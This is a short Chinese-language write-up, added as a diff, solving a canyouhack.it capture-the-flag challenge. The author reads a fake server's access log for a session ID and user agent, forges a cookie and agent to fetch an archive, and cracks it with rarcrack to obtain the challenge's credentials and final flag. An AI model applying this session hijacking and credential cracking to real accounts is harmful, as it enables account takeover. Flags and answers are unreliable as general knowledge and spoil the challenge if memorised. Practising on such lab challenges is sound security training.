@@ -1,0 +1,69 @@
+注意字的颜色 reps
+得到一个终端 help 命令得到可以使用的命令
+
+ls -al /tmp
+
+-rwx------	ptatix	ptatix	99	date	sess_d913bf7597b57e8b49363932354adf53
+
+cat /tmp/sess_readme.txt
+
+# sessions are stored temporary in this folder.
+# each session will be valid for 1 hour except
+# if the user is still online.
+#
+# time is based on server time.
+#
+# you should manually remove invalid sessions
+# by using a cron job to keep this folder clean.
+#
+# you should use another folder to store these
+# for possible security issues.
+
+ls -al /var/log/httpd/
+cat /var/log/httpd/access.log
+
+"GET / HTTP/1.1" 200 2393 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.95 Safari/537.11"
+"GET /test HTTP/1.1" 404 1134 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.95 Safari/537.11"
+"GET /admin HTTP/1.1" 404 1134 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.95 Safari/537.11"
+"GET /acceess HTTP/1.1" 404 1134 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.95 Safari/537.11"
+"GET /admin_panel HTTP/1.1" 404 1134 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.95 Safari/537.11"
+"GET /includes HTTP/1.1" 404 1134 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.95 Safari/537.11"
+"GET /tmp HTTP/1.1" 404 1134 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.95 Safari/537.11"
+"GET /index.php?reps HTTP/1.1" 200 2582 "-" "pt4t1x"
+"GET /style.css HTTP/1.1" 304 - "http://test.com/index.php?reps" "pt4t1x"
+"GET /js/terminal.js HTTP/1.1" 200 2050 "http://test.com/index.php?reps" "pt4t1x"
+"GET /downloads HTTP/1.1" 404 1134 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.95 Safari/537.11"
+"GET /secret HTTP/1.1" 404 1134 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.95 Safari/537.11"
+"GET /?reps HTTP/1.1" 200 2582 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.95 Safari/537.11"
+"GET /js/terminal.js HTTP/1.1" 304 - "/?reps" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.95 Safari/537.11"
+"GET / HTTP/1.1" 200 2393 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)"
+"GET /style.css HTTP/1.1" 200 5033 "http://test.com/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)"
+"GET /js/jquery-1.8.3.min.js HTTP/1.1" 304 - "http://test.com/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)"
+"GET /test HTTP/1.1" 404 1134 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)"
+"GET /admin HTTP/1.1" 404 1134 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)"
+"GET /robots.txt HTTP/1.1" 200 101 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)"
+"GET /hidden HTTP/1.1" 404 1134 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)"
+
+修改
+session=d913bf7597b57e8b49363932354adf53; __ctmz=ptatix%3B/home/ptatix
+User Agent: pt4t1x
+
+同样方式请求 http://canyouhack.it/Content/Challenges/Realistic/1/files/keeppass.php
+获得 keeppass.rar
+
+利用 rarcrack 破解后得到密码 px，获得 passlist.txt
+
+-------------------------------------------------------------------------------------------------
+site		|	user			| pass
+-------------------------------------------------------------------------------------------------
+email		|	ptatix@gmx.com 		: 1337_h4x0r!
+homepage	|	ptatix 			: CorrectHorseBatteryStrapple?
+ssh		|	ptatix 			: K-m0n_4cc3ss
+-------------------------------------------------------------------------------------------------
+
+修改
+session=d913bf7597b57e8b49363932354adf53; __ctmz=ptatix%3B/home/ptatix
+User Agent: pt4t1x
+后利用 homepage 的用户名和密码提交
+
+P-t4t1x_1s_4_n00b
